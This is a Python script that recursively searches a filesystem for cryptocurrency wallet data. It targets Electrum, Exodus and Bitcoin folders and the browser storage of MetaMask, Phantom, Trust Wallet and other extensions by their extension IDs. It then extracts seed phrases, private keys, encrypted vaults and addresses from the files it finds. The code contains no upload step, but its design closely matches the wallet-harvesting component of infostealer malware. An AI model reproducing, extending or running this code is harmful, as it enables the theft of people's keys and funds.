#!/usr/bin/env python3
"""
🔥 WALLET FILE SCANNER - Specialized for wallet extension files
Targets: .dat, .log, .json, keystores, vault files, backups
Cross-platform compatible (Windows/Linux)
"""

import os
import re
import json
from pathlib import Path
from typing import List, Dict, Set, Any


class WalletFileScanner:
    """
    Specialized scanner for wallet extension files
    Focuses on actual wallet data files used by crypto applications
    """
    
    def __init__(self):
        # Wallet file extensions to target
        self.wallet_extensions = {
            '.dat',      # Bitcoin Core wallet.dat, Electrum
            '.wallet',   # Various wallets
            '.log',      # Transaction logs, debug logs
            '.json',     # Metamask, Trust, most modern wallets
            '.txt',      # Backup seeds, private keys
            '.aes',      # Encrypted wallets
            '.key',      # Key files
            '.keystore', # Ethereum keystores
            '.backup',   # Wallet backups
            '.bak',      # Backup files
            '.old',      # Old wallet versions
            '.ldb',      # LevelDB (Chrome extensions)
            '.sqlite',   # SQLite databases (some wallets)
            '.db',       # Generic database files
        }
        
        # Wallet application directory patterns (cross-platform)
        self.wallet_dirs = [
            # Windows paths (use forward slashes, will convert)
            'AppData/Roaming/Electrum',
            'AppData/Roaming/Exodus',
            'AppData/Local/Exodus',
            'AppData/Roaming/Ethereum',
            'AppData/Local/Ethereum',
            'AppData/Roaming/Bitcoin',
            'AppData/Local/Packages/Microsoft.MicrosoftEdge',
            'AppData/Local/Microsoft/Edge',
            'AppData/Local/Google/Chrome',
            'AppData/Local/BraveSoftware',
            'AppData/Roaming/Opera Software',
            
            # Chrome extensions (Metamask, etc.)
            'Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn',  # Metamask
            'Local Extension Settings/ibnejdfjmmkpcnlpebklmnkoeoihofec',  # TronLink
            'Local Extension Settings/jbdaocneiiinmjbjlgalhcelgbejmnid',  # Nifty
            'Local Extension Settings/afbcbjpbpfadlkmhmclhkeeodmamcflc',  # Math Wallet
            'Local Extension Settings/hnfanknocfeofbddgcijnmhnfnkdnaad',  # Coinbase
            'Local Extension Settings/fhbohimaelbohpjbbldcngcnapndodjp',  # Binance
            'Local Extension Settings/bfnaelmomeimhlpmgjnjophhpkkoljpa',  # Phantom (Solana)
            'Local Extension Settings/aiifbnbfobpmeekipheeijimdpnlpgpp',  # Trust Wallet
            'Local Extension Settings/egjidjbpglichdcondbcbdnbeeppgdph',  # Trust Wallet
            'Local Extension Settings/fhilaheimglignddkjgofkcbgekhenbh',  # Oxygen
            'Local Extension Settings/mgffkfbidihjpoaomajlbgchddlicgpn',  # Pali Wallet
            'Local Extension Settings/aholpfdialjgjfhomihkjbmgjidlcdno',  # ExodusWeb3
            
            # Linux paths
            '.electrum',
            '.ethereum',
            '.bitcoin',
            '.config/Exodus',
            '.local/share/Exodus',
            '.config/google-chrome',
            '.config/BraveSoftware',
            '.mozilla/firefox',
            
            # Generic patterns
            'Wallets',
            'Crypto',
            'blockchain',
            'bitcoin',
            'ethereum',
        ]
        
        # Specific wallet files to target (exact names - case insensitive)
        self.target_files = {
            'wallet.dat',
            'default_wallet',
            'electrum.dat',
            'info.json',
            'manifest.json',
            'vault',
            'preferences',      # Chrome/browser extension settings
            'local state',      # Chrome local state
            '000003.log',  # LevelDB
            'current',     # LevelDB
            'lock',        # LevelDB
            'keystore',
            'seed.txt',
            'keys.txt',
            'private.txt',
            'mnemonic.txt',
            'recovery.txt',
            'backup.txt',
            'addresses.txt',
        }
        
    def normalize_path(self, path: str) -> str:
        """Convert path to OS-appropriate format (cross-platform)"""
        # Convert forward slashes to OS-specific separator
        return str(Path(path))
    
    def is_wallet_file(self, file_path: str) -> bool:
        """
        Check if file is a potential wallet file
        Based on extension, name, or location
        """
        try:
            # Normalize path for cross-platform
            file_path = self.normalize_path(file_path)
            path_obj = Path(file_path)
            
            # Check extension
            if path_obj.suffix.lower() in self.wallet_extensions:
                return True
            
            # Check exact filename
            if path_obj.name.lower() in self.target_files:
                return True
            
            # Check if in wallet directory
            path_str = str(path_obj).lower()
            for wallet_dir in self.wallet_dirs:
                wallet_dir_normalized = self.normalize_path(wallet_dir).lower()
                if wallet_dir_normalized in path_str:
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def extract_from_json(self, file_path: str) -> Dict[str, List]:
        """
        Extract wallet data from JSON files
        Handles Metamask vaults, keystores, wallet exports
        """
        results = {
            'seeds': [],
            'keys': [],
            'addresses': [],
            'encrypted_data': []
        }
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                data = json.load(f)
            
            # Metamask vault detection
            if isinstance(data, dict):
                # Look for vault
                if 'vault' in data or 'data' in data:
                    vault_data = data.get('vault') or data.get('data', '')
                    if len(vault_data) > 50:
                        results['encrypted_data'].append({
                            'type': 'METAMASK_VAULT',
                            'data': vault_data[:200],  # Sample
                            'full_length': len(vault_data)
                        })
                
                # Look for mnemonic/seed
                for key in ['mnemonic', 'seed', 'seedPhrase', 'seed_phrase']:
                    if key in data and data[key]:
                        results['seeds'].append(str(data[key]))
                
                # Look for private keys
                for key in ['privateKey', 'private_key', 'privKey', 'key']:
                    if key in data and data[key]:
                        results['keys'].append({
                            'type': 'JSON_PRIVATE_KEY',
                            'key': str(data[key])
                        })
                
                # Look for addresses
                for key in ['address', 'addresses', 'publicKey', 'public_key']:
                    if key in data:
                        if isinstance(data[key], list):
                            results['addresses'].extend([str(a) for a in data[key] if a])
                        elif data[key]:
                            results['addresses'].append(str(data[key]))
                
                # Recursive search for nested data
                self._search_json_recursive(data, results)
            
        except json.JSONDecodeError:
            # Not valid JSON, skip
            pass
        except Exception as e:
            pass
        
        return results
    
    def _search_json_recursive(self, obj: Any, results: Dict, depth: int = 0):
        """Recursively search JSON for wallet data"""
        if depth > 10:  # Prevent infinite recursion
            return
        
        try:
            if isinstance(obj, dict):
                for key, value in obj.items():
                    key_lower = str(key).lower()
                    
                    # Check for seed-related keys
                    if any(x in key_lower for x in ['seed', 'mnemonic', 'phrase']):
                        if isinstance(value, str) and len(value) > 30:
                            results['seeds'].append(value)
                    
                    # Check for key-related keys
                    if any(x in key_lower for x in ['private', 'priv', 'key']):
                        if isinstance(value, str) and len(value) > 40:
                            results['keys'].append({'type': 'JSON_KEY', 'key': value})
                    
                    # Recurse
                    self._search_json_recursive(value, results, depth + 1)
                    
            elif isinstance(obj, list):
                for item in obj[:50]:  # Limit list processing
                    self._search_json_recursive(item, results, depth + 1)
                    
        except:
            pass
    
    def extract_from_log(self, file_path: str) -> Dict[str, List]:
        """
        Extract wallet data from .log files
        Common in Bitcoin Core, Electrum, etc.
        """
        results = {
            'seeds': [],
            'keys': [],
            'addresses': [],
            'transactions': []
        }
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Look for seed phrases in logs (sometimes logged by mistake)
            seed_pattern = r'(?:seed|mnemonic|phrase)[\s:=]+([a-z\s]{50,200})'
            for match in re.finditer(seed_pattern, content, re.IGNORECASE):
                seed_candidate = match.group(1).strip()
                if len(seed_candidate.split()) in [12, 15, 18, 21, 24]:
                    results['seeds'].append(seed_candidate)
            
            # Look for private keys in logs
            key_pattern = r'(?:private|priv|key)[\s:=]+([a-fA-F0-9]{50,66})'
            for match in re.finditer(key_pattern, content, re.IGNORECASE):
                results['keys'].append({
                    'type': 'LOG_PRIVATE_KEY',
                    'key': match.group(1).strip()
                })
            
            # Look for addresses
            # Bitcoin
            btc_pattern = r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
            results['addresses'].extend(re.findall(btc_pattern, content))
            
            # Ethereum
            eth_pattern = r'0x[a-fA-F0-9]{40}'
            results['addresses'].extend(re.findall(eth_pattern, content))
            
            # Transaction hashes
            tx_pattern = r'(?:tx|txid|transaction)[\s:=]+([a-fA-F0-9]{64})'
            for match in re.finditer(tx_pattern, content, re.IGNORECASE):
                results['transactions'].append(match.group(1))
                
        except Exception as e:
            pass
        
        return results
    
    def extract_from_dat(self, file_path: str) -> Dict[str, List]:
        """
        Extract from .dat files (wallet.dat, electrum.dat)
        These are usually binary, search for patterns
        """
        results = {
            'keys': [],
            'addresses': [],
            'encrypted_keys': []
        }
        
        try:
            # Read as binary
            with open(file_path, 'rb') as f:
                # Read in chunks to avoid memory issues
                chunk_size = 1024 * 1024  # 1MB
                content = b''
                while len(content) < 10 * 1024 * 1024:  # Max 10MB
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    content += chunk
            
            # Convert to string (ignore errors)
            text = content.decode('utf-8', errors='ignore')
            
            # Look for private keys (hex format)
            key_pattern = r'\b[a-fA-F0-9]{64}\b'
            potential_keys = re.findall(key_pattern, text)
            for key in potential_keys[:50]:  # Limit to avoid false positives
                results['keys'].append({
                    'type': 'DAT_PRIVATE_KEY',
                    'key': key
                })
            
            # Look for Bitcoin addresses
            btc_pattern = r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b'
            results['addresses'].extend(re.findall(btc_pattern, text)[:100])
            
            # Look for Ethereum addresses
            eth_pattern = r'0x[a-fA-F0-9]{40}'
            results['addresses'].extend(re.findall(eth_pattern, text)[:100])
            
            # Look for encrypted private keys (BIP38)
            bip38_pattern = r'6P[a-fA-F0-9]{56}'
            encrypted = re.findall(bip38_pattern, text)
            for enc_key in encrypted:
                results['encrypted_keys'].append({
                    'type': 'BIP38_ENCRYPTED',
                    'key': enc_key
                })
                
        except Exception as e:
            pass
        
        return results
    
    def scan_file(self, file_path: str) -> Dict[str, Any]:
        """
        Main method to scan a wallet file
        Returns extracted data based on file type
        """
        if not self.is_wallet_file(file_path):
            return {}
        
        file_path = self.normalize_path(file_path)
        extension = Path(file_path).suffix.lower()
        
        results = {
            'file_path': file_path,
            'file_type': extension,
            'seeds': [],
            'keys': [],
            'addresses': [],
            'encrypted_data': [],
            'transactions': []
        }
        
        try:
            # Route to appropriate extractor
            if extension == '.json':
                data = self.extract_from_json(file_path)
                results.update(data)
            elif extension in ['.log', '.txt']:
                data = self.extract_from_log(file_path)
                results.update(data)
            elif extension in ['.dat', '.wallet', '.db', '.ldb']:
                data = self.extract_from_dat(file_path)
                results.update(data)
            else:
                # Try generic text extraction
                data = self.extract_from_log(file_path)
                results.update(data)
            
        except Exception as e:
            pass
        
        return results
    
    def find_wallet_files(self, root_dir: str) -> List[str]:
        """
        Recursively find all wallet files in directory
        Cross-platform compatible
        """
        wallet_files = []
        root_dir = self.normalize_path(root_dir)
        
        try:
            for root, dirs, files in os.walk(root_dir):
                # Normalize root path
                root = self.normalize_path(root)
                
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check if it's a wallet file
                    if self.is_wallet_file(file_path):
                        wallet_files.append(file_path)
            
        except Exception as e:
            pass
        
        return wallet_files
